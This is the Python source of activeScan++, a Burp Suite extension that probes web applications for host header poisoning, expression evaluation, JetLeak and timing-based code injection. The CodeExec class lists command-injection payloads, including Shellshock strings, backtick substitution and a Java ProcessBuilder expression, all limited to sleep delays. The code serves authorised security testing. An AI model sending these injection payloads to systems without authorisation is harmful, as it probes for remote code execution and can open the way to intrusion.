# Author: James Kettle <albinowax+acz@gmail.com>
# Copyright 2014 Context Information Security up to 1.0.5
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    import copy
    from string import Template
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, \
        IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

VERSION = "1.0.13"
FAST_MODE = False
DEBUG = False
callbacks = None
helpers = None

def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return helpers.bytesToString(bytes)

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        callbacks = this_callbacks
        helpers = callbacks.getHelpers()
        callbacks.setExtensionName("activeScan++")

        callbacks.registerScannerCheck(PerRequestScans())

        if not FAST_MODE:
            callbacks.registerScannerCheck(CodeExec())
            callbacks.registerScannerCheck(SuspectTransform())
            callbacks.registerScannerCheck(JetLeak())
            callbacks.registerScannerCheck(SimpleFuzz())

        print "Successfully loaded activeScan++ v" + VERSION

        return


class PerRequestScans(IScannerCheck):
    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
            return []

        base_resp_string = safe_bytes_to_string(basePair.getResponse())
        base_resp_print = tagmap(base_resp_string)
        issues = self.doHostHeaderScan(basePair, base_resp_string, base_resp_print)
        issues.extend(self.doCodePathScan(basePair, base_resp_print))
        return issues


    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
        request = helpers.analyzeRequest(basePair.getRequest())
        params = request.getParameters()


        # pick the parameter most likely to be the first insertion point
        first_parameter_offset = 999999
        first_parameter = None
        for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML, IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
            for param in params:
                if param.getType() != param_type:
                    continue
                if param.getNameStart() < first_parameter_offset:
                    first_parameter_offset = param.getNameStart()
                    first_parameter = param
            if first_parameter:
                break

        if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():
            return True

        else:
            return False

    def doCodePathScan(self, basePair, base_resp_print):
        xml_resp, xml_req = self._codepath_attack(basePair, 'application/xml')
        if xml_resp != -1:
            if xml_resp != base_resp_print:
                zml_resp, zml_req = self._codepath_attack(basePair, 'application/zml')
                assert zml_resp != -1
                if zml_resp != xml_resp:
                    # Trigger a passive scan on the new response for good measure
                    launchPassiveScan(xml_req)
                    return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                            [basePair, xml_req, zml_req],
                                            'XML input supported',
                                            "The application appears to handle application/xml input. Consider investigating whether it's vulnerable to typical XML parsing attacks such as XXE.",
                                            'Tentative', 'Information')]

        return []

    def _codepath_attack(self, basePair, content_type):
        modified, request = setHeader(basePair.getRequest(), 'Content-Type', content_type)
        if not modified:
            return -1, None
        result = callbacks.makeHttpRequest(basePair.getHttpService(), request)
        resp = result.getResponse()
        if resp is None:
            resp = ''
        return tagmap(safe_bytes_to_string(resp)), result

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


    def doHostHeaderScan(self, basePair, base_resp_string, base_resp_print):

        rawHeaders = helpers.analyzeRequest(basePair.getRequest()).getHeaders()

        # Parse the headers into a dictionary
        headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])

        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return []

        # If the response doesn't reflect the host header we can't identify successful attacks
        if (headers['HOST'] not in base_resp_string):
            debug_msg("Skipping host header attacks on this request as the host isn't reflected")
            return []

        # prepare the attack
        request = safe_bytes_to_string(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)

        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)

        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if ('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)

        if ('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)

        referer = randstr(6)
        request_template = Template(request)


        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        legit = headers['HOST']
        taint = randstr(6)
        taint += '.' + legit
        issues = []

        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, {'host': taint}, taint, request_template, referer)
        if hit(resp, base_resp_print):

            # flag DNS-rebinding if the page actually has content
            if base_resp_print != '':
                issues.append(self._raise(basePair, attack, 'dns'))

            if taint in resp and referer not in resp:
                issues.append(self._raise(basePair, attack, 'host'))
                return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, {'abshost': legit, 'host': taint}, taint, request_template, referer)
            if hit(resp, base_resp_print) and taint in resp and referer not in resp:
                issues.append(self._raise(basePair, attack, 'abs'))

        # Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, {'host': legit, 'xfh': taint}, taint, request_template, referer)
        if hit(resp, base_resp_print) and taint in resp and referer not in resp:
            issues.append(self._raise(basePair, attack, 'xfh'))

        return issues

    def _raise(self, basePair, attack, type):
        service = attack.getHttpService()
        url = helpers.analyzeRequest(attack).getUrl()

        if type == 'dns':
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>

                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>

                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """

        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue

    def _attack(self, basePair, payloads, taint, request_template, referer):
        proto = helpers.analyzeRequest(basePair).getUrl().getProtocol() + '://'
        if 'abshost' in payloads:
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + referer

        # Load the supplied payloads into the request
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']

        for key in ('xfh', 'abshost', 'host', 'referer'):
            if key not in payloads:
                payloads[key] = ''

        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = str(time.time())

        request = request_template.substitute(payloads)

        attack = callbacks.makeHttpRequest(basePair.getHttpService(), request)

        response = safe_bytes_to_string(attack.getResponse())

        requestHighlights = [jarray.array([m.start(), m.end()], 'i') for m in
                             re.finditer('(' + '|'.join(payloads.values()) + ')',
                                         safe_bytes_to_string(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(), m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return attack, response


# Ensure that error pages get passively scanned
# Stacks nicely with the 'Error Message Checks' extension
class SimpleFuzz(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        attack = request(basePair, insertionPoint, 'a\'a\\\'b"c>?>%}}%%>c<[[?${{%}}cake\\')
        if tagmap(safe_bytes_to_string(attack.getResponse())) != tagmap(safe_bytes_to_string(basePair.getResponse())):
            launchPassiveScan(attack)

        return []

    def doPassiveScan(self, basePair):
        return []


# Detect suspicious input transformations
class SuspectTransform(IScannerCheck):
    def __init__(self):

        self.checks = {
            'quote consumption': self.detect_quote_consumption,
            'arithmetic evaluation': self.detect_arithmetic,
            'expression evaluation': self.detect_expression,
            'EL evaluation': self.detect_alt_expression,
        }

        self.confirm_count = 2

    def detect_quote_consumption(self, base):
        return anchor_change("''", ["'"])

    def detect_arithmetic(self, base):
        x = random.randint(99, 9999)
        y = random.randint(99, 9999)
        probe = str(x) + '*' + str(y)
        expect = str(x * y)
        return probe, expect

    def detect_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '${' + probe + '}', expect

    def detect_alt_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '%{' + probe + '}', expect

    def doActiveScan(self, basePair, insertionPoint):
        base = insertionPoint.getBaseValue()
        initial_response = safe_bytes_to_string(basePair.getResponse())
        issues = []
        checks = copy.copy(self.checks)
        while checks:
            name, check = checks.popitem()
            for attempt in range(self.confirm_count):
                probe, expect = check(base)
                if isinstance(expect, basestring):
                    expect = [expect]

                debug_msg("Trying " + probe)
                attack = request(basePair, insertionPoint, probe)
                attack_response = safe_bytes_to_string(attack.getResponse())

                matched = False
                for e in expect:
                    if e in attack_response and e not in initial_response:
                        matched = True
                        if attempt == self.confirm_count - 1:
                            issues.append(
                                CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                                'Suspicious input transformation: ' + name,
                                                "The application transforms input in a way that suggests it might be vulnerable to some kind of server-side code injection:<br/><br/> "
                                                "The following probe was sent: <b>" + probe +
                                                "</b><br/>The server response contained the evaluated result: <b>" + e +
                                                "</b><br/><br/>Manual investigation is advised.", 'Tentative', 'High'))

                        break

                if not matched:
                    break

        return issues

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


# Detect CVE-2015-2080
# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
class JetLeak(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        if 'Referer' != insertionPoint.getInsertionPointName():
            return []
        attack = request(basePair, insertionPoint, "\x00")
        resp_start = safe_bytes_to_string(attack.getResponse())[:90]
        if '400 Illegal character 0x0 in state' in resp_start and '<<<' in resp_start:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                    'CVE-2015-2080 (JetLeak)',
                                    "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory<br/>"
                                    "Please refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information",
                                    'Firm', 'High')]
        return []

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self):
        # self._helpers = callbacks.getHelpers()

        self._done = getIssues('Code injection')

        self._payloads = {
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271, CVE-2014-6278
            'any': ['() { :;}; /bin/sleep $time',
                    '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)', '`sleep $time`'],
            'php': [],
            'perl': ['/bin/sleep $time|'],
            'ruby': ['|sleep $time & ping -n $time localhost'],
            # Expression language injection
            'java': [
                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }

        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5': 'php',
            'php4': 'php',
            'php3': 'php',
            'php': 'php',
            'pl': 'perl',
            'cgi': 'perl',
            'jsp': 'java',
            'do': 'java',
            'action': 'java',
            'rb': 'ruby',
            '': ['php', 'ruby', 'java'],
            'unrecognised': 'java',

            # Code we don't have exploits for
            'asp': 'any',
            'aspx': 'any',
        }

    def doActiveScan(self, basePair, insertionPoint):

        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])

        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if (baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if self._attack(basePair, insertionPoint, payload, 11)[0] > max(baseTime + 6, 10):
                debug_msg("Suspicious delay detected. Confirming it's consistent...")
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)

                if dummyAttack.getResponse() is None:
                    debug_msg('Received empty response to baseline request - abandoning attack')
                    break

                if (dummyTime < baseTime + 4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                    if timer > max(dummyTime + 6, 10):
                        debug_msg("Code execution confirmed")
                        url = helpers.analyzeRequest(attack).getUrl()
                        if (url in self._done):
                            debug_msg("Skipping report - vulnerability already reported")
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                    dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                    timer) + "</b> seconds", 'Firm', 'High')]

        return []

    def _getLangs(self, basePair):
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        if '.' in path:
            ext = path.split('.')[-1]
        else:
            ext = ''

        if (ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if (isinstance(code, basestring)):
            code = [code]
        return code

    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)

        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = request(basePair, insertionPoint, payload)
        timer = time.time() - timer
        debug_msg("Response time: " + str(round(timer, 2)) + "| Payload: " + payload)

        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if (not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)

        return (timer, attack)

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService


# misc utility methods

def launchPassiveScan(attack):
    if attack.getResponse() is None:
        return
    service = attack.getHttpService()
    using_https = service.getProtocol() == 'https'
    callbacks.doPassiveScan(service.getHost(), service.getPort(), using_https, attack.getRequest(),
                            attack.getResponse())
    return


def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def randstr(length=12, allow_digits=True):
    candidates = string.ascii_lowercase
    if allow_digits:
        candidates += string.digits
    return ''.join(random.choice(candidates) for x in range(length))


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))

def anchor_change(probe, expect):
    left = randstr(4)
    right = randstr(4, allow_digits=False)
    probe = left + probe + right
    expected = []
    for x in expect:
        expected.append(left + x + right)
    return probe, expected

# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))


def request(basePair, insertionPoint, attack):
    req = insertionPoint.buildRequest(attack)
    return callbacks.makeHttpRequest(basePair.getHttpService(), req)

def is_same_issue(existingIssue, newIssue):
    if existingIssue.getIssueName() == newIssue.getIssueName():
        return -1
    else:
        return 0


def debug_msg(message):
    if DEBUG:
        print message


# FIXME breaking some requests somehow
def setHeader(request, name, value):
    # find the end of the headers
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    # walk over the headers and change as appropriate
    headers = safe_bytes_to_string(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    # stitch the request back together
    if modified:
        modified_request = helpers.stringToBytes('\n'.join(headers) + '\n') + request[body_start:]
    else:
        modified_request = request

    return modified, modified_request
